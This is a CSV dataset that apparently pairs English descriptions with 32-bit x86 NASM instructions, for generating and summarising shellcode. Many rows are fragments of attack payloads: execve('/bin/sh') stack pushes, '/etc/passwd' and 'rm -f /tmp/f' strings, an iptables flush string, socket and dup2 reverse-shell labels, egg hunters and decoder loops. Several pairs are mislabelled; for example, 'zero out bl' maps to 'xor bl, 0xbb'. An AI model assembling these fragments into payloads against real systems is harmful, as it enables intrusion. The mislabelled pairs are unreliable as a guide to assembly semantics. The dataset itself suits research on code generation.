input_text,target_text
ShellCodeGen: subtract the byte value 0x1 from esp register and save the result in esp,"sub esp, byte 0x1"
ShellCodeGen: move the contents of zero_reg into the memory location specified by the operation [ebp+20],"mov [ebp+20], zero_reg"
"ShellCodeSum: mov cx, 2001Q",move 2001Q into cx
ShellCodeGen: subtract the contents of the edx register from the contents of the edx register,"sub edx, edx"
ShellCodeSum: push 0x74,push 0x74 to the stack
ShellCodeGen: move the byte starting at the address [esi + eax + 1] into the bl register,"mov bl, byte [esi + eax + 1]"
ShellCodeGen: if the contents of the eax register is not zero then jump to the label do_next_accept,"test eax, eax \n jnz do_next_accept"
"ShellCodeSum: mov dl, 0xff",move 0xff into dl
ShellCodeGen: push 0x2f2f2f2f onto the stack,push 0x2f2f2f2f
ShellCodeGen: push the value 0x64687373 onto the stack and point the ebx register to the stack register,"push 0x64687373 \n mov ebx, esp"
"ShellCodeSum: shr bl, 4",right shift the contents of bl register by 4 bit positions
ShellCodeGen: declare message string msg2 containing 'this is how we recycle in nasm',"msg2 db 'this is how we recycle in nasm.', 0ah"
ShellCodeSum: _socket:,define the _socket label
ShellCodeGen: _start function,_start:
ShellCodeGen: jump short to the _cmd label,jmp short _cmd
ShellCodeGen: declare the main label,main:
ShellCodeGen: jump to nextarg label,jmp nextarg
"ShellCodeSum: mov ecx, esp",point ecx to the top of the stack
ShellCodeSum: db 'rm -f /tmp/f',define the byte string 'rm -f /tmp/f'
ShellCodeGen: if the remainder is not equal to zero jump to local label checkbuzz,jne checkbuzz
ShellCodeGen: declare an unlabeled byte initialized to 0x80,db 0x80
"ShellCodeSum: xor dl, 0xbb",perform a logical xor between the dl register and 0xbb and save the result in dl
"ShellCodeSum: lea esi, [esi+4]",load the effective address [esi+4] into esi
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov esi, esp"
ShellCodeGen: push the byte 0x8 onto the stack and point edx to the stack register,"push byte 0x8 \n mov edx, esp"
ShellCodeGen: decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register,"loopnz L3 \n mov edx, 7"
ShellCodeGen: move 0x68732f2f into the dword at the memory location [esp-8],"mov dword [esp-8], 0x68732f2f"
ShellCodeGen: push the dword 0x69622f2f onto the stack,push dword 0x69622f2f
ShellCodeGen: decrement ecx,dec ecx
"ShellCodeSum: test eax, eax \n jnz short _parent",if the contents of the eax register is not zero then jump short to the label _parent
ShellCodeSum: push dword 0x017aa8c0,push the dword 0x017aa8c0 onto the stack
ShellCodeGen: push the doubleword 0x00000000 onto the stack,push dword 0x00000000
"ShellCodeSum: cmp al, 0xf2 \n je _start \n mov eax, 0x50905090",jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
ShellCodeGen: jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \ jnz _end \n jmp edi
ShellCodeGen: get 36 in the ecx,"mov ecx, 36"
ShellCodeGen: push the byte 0x05 onto the stack,push byte 0x05
ShellCodeGen: zero out bl register,"xor bl, 0xbb"
ShellCodeGen: push the word 0x6666 onto the stack,push word 0x6666
ShellCodeGen: push 0x0a3a7964 onto the stack,push 0x0a3a7964
ShellCodeSum: push byte 54,push the byte 54 onto the stack
"ShellCodeSum: mov bl, 0bh",move 0bh into bl
ShellCodeGen: define me label,me:
"ShellCodeSum: xor edi, edi",initialize edi with 0
"ShellCodeSum: mov eax, 4",specify sys_write call
ShellCodeSum: push byte 0x66,push the byte 0x66 onto the stack
ShellCodeSum: jns loopinghere,jump to the loopinghere label if the previous instruction clears the sign flag
ShellCodeGen: call my_subroutine,call my_subroutine
"ShellCodeSum: sub eax, 0x2c3d2dff",subtract 0x2c3d2dff from the contents in eax and save the result in eax
ShellCodeGen: move 0x80 into ah,"mov ah, 0x80"
ShellCodeGen: define the doubleword arr and initialize it to 50,arr dd 50
"ShellCodeSum: test edx, edx",test the contents of the edx register
ShellCodeGen: push the ax onto the stack,push ax
ShellCodeGen: define the _write label,_write:
ShellCodeGen: push esi on the stack,push esi
"ShellCodeSum: mov edi, 0x978cd092",move 0x978cd092 into edi
ShellCodeGen: push the 0x2f656c2d onto the stack,push 0x2f656c2d
ShellCodeSum: do_dup:,define do_dup label
ShellCodeGen: define decoder label,decoder:
ShellCodeSum: loop decode \n jmp edx,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register
ShellCodeGen: push the byte 17h onto the stack,push byte 17h
ShellCodeSum: jmp short cmd,jump short to the cmd label
ShellCodeGen: load the effective address of the result of the operation [esi+22] into the ecx register,"lea ecx, [esi+22]"
ShellCodeGen: divide edx by 2 using right shift,"shr edx, 1"
ShellCodeGen: compare ebx register's lower half value against ascii value 48,"cmp bl, 48"
"ShellCodeSum: mov ax, 0x16b",move 0x16b into ax
ShellCodeGen: push the contents of the eax register onto the stack and point ecx to the stack register,"push eax \n mov ecx, esp"
ShellCodeSum: word_value dw 300,define the word value word_value and initialize it to 300
ShellCodeGen: jump short to the label _parent if the contents of the eax register is not zero,"test eax, eax \n jnz short _parent"
ShellCodeGen: move the contents of the esi register into the al register,"mov al, [esi]"
ShellCodeGen: move the contents at memory specified by z to eax,"mov eax, [z]"
ShellCodeGen: restore the top of the stack into the esp register,pop esp
ShellCodeGen: jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e,"cmp BYTE [edx], 0x2e \n jne l2"
ShellCodeGen: move /bin/sh into the ebx register,"push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeGen: move 0xff into dh,"mov dh, 0xff"
ShellCodeGen: push 0x10 onto the stack,push 0x10
"ShellCodeSum: mov ebx, esp",move the contents of the esp register into the ebx register
ShellCodeGen: push the word [edx] to the stack,push word [edx]
ShellCodeSum: push 0x61702f2f,push 0x61702f2f onto the stack
ShellCodeSum: scasd \n jnz _end \n jmp edi,jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
ShellCodeGen: move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx,"mov dword [ebx], 2"
ShellCodeGen: push 0x6d726574 to the stack,push 0x6d726574
ShellCodeSum: callpop:,define the callpop label
ShellCodeSum: call _build,call the _build function
"ShellCodeSum: mov al, 72h",move 72h into al
"ShellCodeSum: sub ax, 1564",subtract 1564 from the contents of the ax register
ShellCodeGen: move the value of register at address esp+4 and store into eax,"mov eax, [esp+4]"
ShellCodeSum: push 0x2e373231,push 0x2e373231 onto the stack
ShellCodeSum: dec ebx,subtract one from the contents of ebx
ShellCodeSum: jnz loop,jump to loop if not equal to zero
"ShellCodeGen: define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b","db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b"
ShellCodeGen: jump to the formatting label if the zero flag is set,jz formatting
ShellCodeSum: main_inc:,declare the main_inc label
ShellCodeGen: move 0x1 into ebx,"mov ebx, 0x1"
"ShellCodeSum: mov al, byte [edi]",move the byte in edi into the al register
ShellCodeGen: subtract 1634 from the contents of the bx register,"sub bx, 1634"
"ShellCodeSum: mov bl, dl",move dl into bl
ShellCodeSum: push esp,push the contents of esp register onto the stack
ShellCodeGen: move the contents of the eax into the double word starting at the address [esp-0x4],"mov dword [esp-0x4], eax"
ShellCodeSum: push word 0x6465,push the word 0x6465 onto the stack
ShellCodeGen: if the contents of the cl register is not equal to the value 0x3 then jump to the loop label,"cmp cl, 0x3 \n jne loop"
ShellCodeGen: jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register,"cmp dword [eax], ebx \n jne next_addr \n jmp eax"
"ShellCodeSum: sub bl, 0x7",subtract 0x7 from the contents in bl and save the result in bl
"ShellCodeSum: cmp ax, bx \n jne l3 \n jmp while",if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label
"ShellCodeSum: xor ax, 0x3041",perform the xor operation between the ax register and the value 0x3041
ShellCodeGen: push the 0x7374736f onto the stack,push 0x7374736f
ShellCodeSum: push ebp,save old base pointer
ShellCodeGen: move the contents of the esp register into the edx register,"mov edx, [esp]"
"ShellCodeSum: loop l1 \n mov eax, esp",decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
"ShellCodeSum: mov ax, 8h",move 8h into ax
ShellCodeGen: define the _parent_read label,_parent_read:
"ShellCodeSum: xor eax, 0x7575",perform a logical xor operation between eax and 0x7575
ShellCodeSum: push word bx,push the word bx to the stack
ShellCodeSum: loop decode \n jmp Shellcode,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label
"ShellCodeSum: mov ebx, 0",use stdin
ShellCodeSum: loop main_loop,decrement the counter and jump to the main_loop label if the count is not zero
ShellCodeGen: make the system call to terminate the process,"mov eax, 1"
"ShellCodeSum: xor edx, edx \n cmp ecx, edx \n jne l2",zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register
ShellCodeSum: mul ecx,multiply eax by ecx
"ShellCodeSum: mov bl, 0x1",move the value 0x1 into the bl register
ShellCodeGen: push 0x68736164 onto the stack,push 0x68736164
"ShellCodeSum: lea ebx, [esi+15]",load the effective address [esi+15] into ebx
ShellCodeGen: decrement the ebx register by one,dec ebx
ShellCodeGen: jump to the loop label if the zero flag is cleared,jnz loop
ShellCodeSum: push dword [edx+2],push the dword [edx+2] onto the stack
ShellCodeSum: neg eax,replaces the contents of the eax register with its two's complement
ShellCodeGen: add 0x2d383638 to the contents in eax and save the result in eax,"add eax, 0x2d383638"
ShellCodeGen: install signal handel,"mov eax, 48"
ShellCodeGen: compare the dword at the address [eax-4] and egg1,"cmp dword [eax-4], egg1"
ShellCodeSum: l00p:,declare the l00p label
ShellCodeGen: declare the write label,write:
"ShellCodeSum: cmp byte [eax], 0",compare the byte pointed to by eax at this address against zero
ShellCodeSum: _isegg:,define the _isegg label
ShellCodeGen: move ecx into the doubleword starting at the address esp-4,"mov dword [esp-4], ecx"
"ShellCodeSum: mov al, 1",move the value 1 into the al register
ShellCodeGen: jump to loop if not equal to zero,jnz loop
"ShellCodeSum: push dword 0x74652f2f \n mov ecx, esp",push double word 0x74652f2f onto the stack and point the ecx register to the stack register
ShellCodeGen: decrease eax by 3,"sub eax, 3"
ShellCodeGen: clear the ebx register,"xor ebx, ebx"
ShellCodeGen: move ecx into edi,"mov edi, ecx"
ShellCodeGen: push 0x7665642f onto the stack,push 0x7665642f
"ShellCodeSum: mov byte [edx + eax], bl",move bl into the byte at address [edx + eax]
ShellCodeGen: move the byte at the address [esi] into bl,"mov bl, byte [esi]"
ShellCodeGen: move the effective address of digits+eax into al,"mov al, byte [digits+eax]"
ShellCodeGen: sigaction,"mov eax, 67"
ShellCodeSum: inc cl,increment the contents of the cl register
ShellCodeSum: push 0x782f2f32,push 0x782f2f32 onto the stack
ShellCodeSum: push dword 0x6f702f6e,push the dword 0x6f702f6e onto the stack
ShellCodeSum: pop esi,restore the top of the stack into the esi register
ShellCodeSum: dec cl,decrement the contents of cl
"ShellCodeSum: mov ecx, contents",move the memory address of contents variable into ecx
ShellCodeGen: push the byte 0x01 onto the stack,push byte 0x01
ShellCodeGen: move pointer in eax into esi,"mov esi, eax"
ShellCodeGen: push the contents of edx register onto the stack,push edx
"ShellCodeSum: mov eax, 1",make the system call to terminate the process
ShellCodeGen: declare the bss section,section .bss
"ShellCodeSum: push esi \n mov edx, esp",push the contents of the esi register onto the stack and point edx to the stack register
ShellCodeSum: jne loop,jump to the address specified by the label loop if the operands are not equals in the previous comparison
ShellCodeGen: jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi,scasd \n jnz _end
ShellCodeSum: push dword 0x69622f2f,push the dword 0x69622f2f onto the stack
ShellCodeGen: move 54 into al,"mov al, 54"
ShellCodeSum: push ebx,push the ebx value to the stack
ShellCodeSum: jmp short call_decoder,jump short to call_decoder
"ShellCodeSum: cmp ecx, edx \n ja l1",jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register
"ShellCodeSum: word_table dw 134, 345, 564, 123",declare the array of words word_table initialized to 134 345 564 and 123
ShellCodeSum: db '/etc/passwd#',define the byte string '/etc/passwd#'
ShellCodeGen: push the 0x697a onto the stack,pushw 0x697a
ShellCodeGen: reset both lower and uppper bytes of eax to be 0,"xor eax, eax"
ShellCodeGen: push 0x6567772f onto the stack,push 0x6567772f
ShellCodeSum: inc byte [esp+ecx],increment the byte at the address [esp+ecx] by one
ShellCodeGen: move the value 0x72702f2f into the double word starting at the address [esp-0x28],"mov dword [esp-0x28], 0x72702f2f"
ShellCodeGen: move 5 into ebx,"mov ebx, 5"
ShellCodeGen: add 24 to eax,"add eax, 24"
ShellCodeSum: jne no_error,jump to the label no_error if not equal
ShellCodeSum: pop eax,restore eax from the value we pushed onto the stack at the start
ShellCodeGen: pop the value on the stack back into esi,pop esi
ShellCodeSum: push 0x61622f6e,push 0x61622f6e onto the stack
ShellCodeGen: system call signal,"mov eax, 48"
ShellCodeSum: jz encoded,if zero jump to the encoded label
ShellCodeGen: move 0x0a into the byte at address [esp],"mov byte [esp], 0x0a"
ShellCodeSum: push byte +0x6,push the byte +0x6 onto the stack
ShellCodeGen: move 0x09 into dl,"mov dl, 0x09"
ShellCodeSum: db '/sbin/iptables#-f#',define the byte string '/sbin/iptables#-f#'
"ShellCodeSum: mov cl, 077o",move 077o into cl
ShellCodeSum: push 0x76766c2d,push 0x76766c2d onto the stack
ShellCodeGen: move the byte at the address [esi + 1] into dl,"mov dl, byte [esi + 1]"
ShellCodeGen: call kernel,int 0x80
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov eax, esp"
ShellCodeGen: move the contents of the ax register at the memory location specified by the operation [bp+0x3e],"mov [bp+0x3e], ax"
ShellCodeGen: compare the contents of eax and the contents of ebx,"cmp eax, ebx"
"ShellCodeSum: lea esp, [ebx]",load the value of register ebx into register esp
"ShellCodeSum: mov bl, 0x4",move the value 0x4 onto the stack
"ShellCodeSum: cmp al, 0xf2 \n je _start",jump to the _start label if the contents of the al register is equal to the value 0xf2
"ShellCodeSum: cmp eax, ebx \n je exit",if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label
ShellCodeGen: subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero,"sub bl, 3 \n jnz stage"
ShellCodeGen: push len onto the stack,push len
"ShellCodeSum: mov cl, 0x1e",move 0x1e into cl
ShellCodeGen: terminate the process,"mov eax, 1"
"ShellCodeSum: mov dl, 0xd",move 0xd into dl
ShellCodeGen: push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register,"push 0x6e69622f \n push 0x7273752f \n mov edx, esp"
ShellCodeGen: restore the top of the stack into the ebp register,pop ebp
ShellCodeSum: push 0x68732f2f,push 0x68732f2f to the stack
"ShellCodeSum: lea bx, [bp+0x0b]",load the effective address of the operation bp+0x0b] into the bx register
ShellCodeGen: system call sigaction,"mov eax, 67"
ShellCodeGen: load the effective address of ebx into the edi register,"lea edi, [ebx]"
ShellCodeGen: move 4 into al,"mov al, 4"
ShellCodeSum: loopnz decode,decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
"ShellCodeSum: xor ecx, ecx",reset ecx to 0
"ShellCodeSum: xchg ebx, eax",exchange the contents of the ebx register with the contents of the eax register
ShellCodeGen: push the contents of the esi register onto the stack and point ecx to the stack register,"push esi \n mov ecx, esp"
ShellCodeSum: jmp multiplyloop,jump to label multiplyloop
ShellCodeSum: push edx,push the contents of the edx register onto the stack
ShellCodeGen: restore the top of the stack into the edx register,pop edx
ShellCodeGen: subtract 0xd from the byte at the address esi,"sub byte [esi], 0xd"
ShellCodeGen: jump to the _start label if the contents of the al register is equal to the value 0xf2,"cmp al, 0xf2 \n je _start"
ShellCodeSum: inc_dec:,declare inc_dec function
ShellCodeGen: perform a logical xor between the address speicified by [ecx + 116] and the bh register and save the result in [ecx + 116],"xor [ecx + 116], bh"
ShellCodeGen: define the byte string 'egg mark',db 'egg mark'
ShellCodeGen: move eax into edx,"mov edx, eax"
ShellCodeGen: define the byte value bytes and initialize it to 10,bytes db 10
"ShellCodeSum: mov al, 0x2e",move 0x2e into al
ShellCodeGen: if 0 then jump to loc_402b13,jz short loc_402b13
ShellCodeGen: declare text section,section .text
ShellCodeSum: push 0x706d742f,push 0x706d742f to the stack
ShellCodeGen: system call getpid,"mov eax, 20"
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov ecx, esp"
"ShellCodeSum: mov eax, childmsg",move childmsg into eax
ShellCodeGen: push 0x67513231 onto the stack,push 0x67513231
"ShellCodeSum: add esi, 0x30",add 0x30 to esi
"ShellCodeSum: shl eax,2",left shift eax by two bits
ShellCodeGen: push the 0x6962732f onto the stack,push 0x6962732f
ShellCodeGen: declare the priv_setgid label,priv_setgid:
"ShellCodeSum: mov edi, 0x343997b7",move 0x343997b7 into edi
ShellCodeSum: inc dword [var],add one to the doubleword integer stored at location var
ShellCodeSum: msg_len equ $-msg,define msg_len equal to the length of msg
ShellCodeGen: load the effective address [esi+26] into edx,"lea edx, [esi+26]"
ShellCodeGen: move the memory address of contents string into ecx,"mov ecx, contents"
ShellCodeGen: push the byte chmod_call onto the stack,push byte chmod_call
ShellCodeGen: add ebx to eax and store the result in eax,"add eax, ebx"
ShellCodeGen: push 0x32322e32 to the stack,push 0x32322e32
ShellCodeGen: declare the decoder label,decoder:
ShellCodeGen: push the byte 0x77 onto the stack,push byte 0x77
ShellCodeGen: increment ebx register,inc ebx
ShellCodeGen: push the double word 0x303a3a31 onto the stack,push dword 0x303a3a31
ShellCodeGen: move 0x4 into bl,"mov bl, 0x4"
ShellCodeSum: call writestring,call the writestring function
"ShellCodeSum: push 0x6e7a762d \n mov ebp, esp",push the value 0x6e7a762d onto the stack and point the ebp register to the stack register
ShellCodeGen: push the dword 0x776f6461 onto the stack,push dword 0x776f6461
ShellCodeSum: push byte 15,push the byte 15 onto the stack
ShellCodeGen: subtract 1564 from the contents of ax register and save the result in ax,"sub ax, 1564"
ShellCodeGen: perform the xor operation between the ax register and the value 0x4f73,"xor ax, 0x4f73"
ShellCodeSum: push byte 0x4 \n pop eax,put the syscall 0x4 into the eax register
"ShellCodeSum: add eax, 0x10",add 0x10 to eax
"ShellCodeSum: mov bl, 0x3",move 0x3 into bl
ShellCodeGen: jump to label read,jmp read
ShellCodeGen: add the contents of the eax register to the edx register,"add edx, eax"
"ShellCodeSum: mov edx, readbuffer",move readbuffer into edx
"ShellCodeSum: cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD",if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register
"ShellCodeSum: ror esi, 1",right rotate the contents of the esi register by 1 bit
ShellCodeSum: push word 0x462d,push the word 0x462d to the stack
ShellCodeSum: jz formatting,jump to the formatting label if the zero flag is set
ShellCodeGen: push the byte 0x77 to the stack,push byte 0x77
ShellCodeGen: jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register,"cmp eax, edi \n jne infinite \n xor eax, eax"
ShellCodeSum: push 0x6e,push the 0x6e onto the stack
"ShellCodeSum: cmp [ebp+var_a], 0",compare if the contents at memory location ebp+var_a is 0
ShellCodeSum: my_table times 10 dw 0,allocate my_table vector of 10 words each initialized to 0
ShellCodeGen: move rm to ecx,"mov ecx, rm"
ShellCodeGen: move the value 0x65636170 into the double word starting at the address [esp-0x8],"mov dword [esp-0x8], 0x65636170"
ShellCodeGen: left shift the contents of the esi register by 0x1 bit,"shl esi, 0x1"
ShellCodeGen: push 0xf onto the stack,push 0xf
"ShellCodeSum: mov esi, edx",move remainder into esi
ShellCodeSum: jnz exeunt,jump to exeunt if not zero
"ShellCodeSum: test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6",jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register
ShellCodeGen: move the value 1 into the al register,"mov al, 1"
ShellCodeGen: jump to the label l1 if the contents of the al register is greater than the decimal value 9,"cmp al, 9 \n jg l1"
"ShellCodeSum: mov eax, 1",invoke sys_exit
ShellCodeGen: push 0x30317974 onto the stack,push 0x30317974
"ShellCodeSum: mov al, 0xa2",move 0xa2 into al
ShellCodeGen: push the word 10 to the stack,push word 10
ShellCodeGen: move address of request variable into ecx,"mov ecx, request"
ShellCodeSum: neg ecx,replaces the contents of the ecx register with its two's complement
ShellCodeGen: if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon,"test ax, ax \n jnz exeunt \n jmp carryon"
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov edi, esp"
"ShellCodeSum: mov cl, byte [eax]",move the byte at the address [eax] into cl
"ShellCodeSum: push ebx \n mov ecx, esp",push the contents of the ebx register onto the stack and point ecx to the stack register
"ShellCodeSum: push word 0x632d \n mov edx, esp",push the word 0x632d onto the stack and point the edx register to the stack register
"ShellCodeSum: mov ecx, 672274793",move the value 672274793 into the ecx register
ShellCodeGen: define the _random label,_random:
ShellCodeSum: stage:,define stage label
ShellCodeGen: place the quantity ebx+4*esi in edi,"lea edi, [ebx+4*esi]"
ShellCodeGen: jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register,"cmp dword [eax-4], egg2 \n je _next \n jmp eax"
ShellCodeGen: decrement the dl register by one,dec dl
ShellCodeSum: jns dup2,jump to the dup2 label if the previous instruction clears the sign flag
ShellCodeSum: jmp _read,jump to _read
"ShellCodeSum: xor zero_reg, zero_reg",zero out zero_reg
ShellCodeSum: call my_subroutine,call my_subroutine
ShellCodeGen: jump to the label socket if the contents of the eax register is zero,"test eax, eax \n jz socket"
"ShellCodeSum: mov al, 0x0b",move 0x0b into al
ShellCodeGen: perform logical and between ax and 1,"and ax, 1"
"ShellCodeSum: push word 2 \n mov ecx, esp",push the word 2 onto the stack and point ecx to the stack register
ShellCodeGen: move 0x3f into al,"mov al, 0x3f"
ShellCodeGen: restore eax from the value we pushed onto the stack at the start,pop eax
"ShellCodeSum: mov bl, [esi+ecx]",move the contents of memory address esi+ecx into bl
"ShellCodeSum: loop l3 \n mov ecx, esp",decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
ShellCodeGen: move 0x8b90909d into eax,"mov eax, 0x8b90909d"
"ShellCodeSum: mov byte [esi+14],al",move the contents of al into the byte at the memory location specified by the operation [esi+14]
ShellCodeGen: jump to exeunt if not zero,jnz exeunt
ShellCodeGen: subtract the contents of ecx from the contents of ecx,"sub ecx, ecx"
